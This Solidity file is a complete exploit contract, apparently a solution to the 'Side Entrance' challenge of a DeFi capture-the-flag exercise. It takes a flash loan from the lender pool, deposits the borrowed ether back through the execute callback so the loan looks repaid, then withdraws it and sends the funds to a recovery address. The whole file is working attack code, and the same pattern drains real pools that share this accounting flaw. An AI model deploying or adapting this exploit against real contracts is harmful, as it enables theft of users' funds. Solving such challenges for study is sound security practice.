// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

/**
 * @title PwnSideEntranceLenderPool
 * @dev Contract to exploit SideEntranceLenderPool
 */
contract PwnSideEntranceLenderPool {

    SideEntranceLenderPool public immutable pool;
    address public recovery; 
    uint public exploitAmount;

    constructor(address _pool, address _recovery, uint _amount){
        pool = SideEntranceLenderPool(_pool);
        recovery = _recovery;
        exploitAmount = _amount;
    }

    function pwn() external returns (bool){
        uint balanceBefore = address(this).balance;
        pool.flashLoan(exploitAmount);      //flashloan will call execute function on this contract
        pool.withdraw();
        uint balanceAfter = address(this).balance;
        require(balanceAfter > balanceBefore, "have not stolen the funds");
        payable(recovery).transfer(exploitAmount);  //send funds to recovery address because we are good
        return true;

    }

    function execute() external payable{
        pool.deposit{value:msg.value}();
    }

    receive() external payable{}
}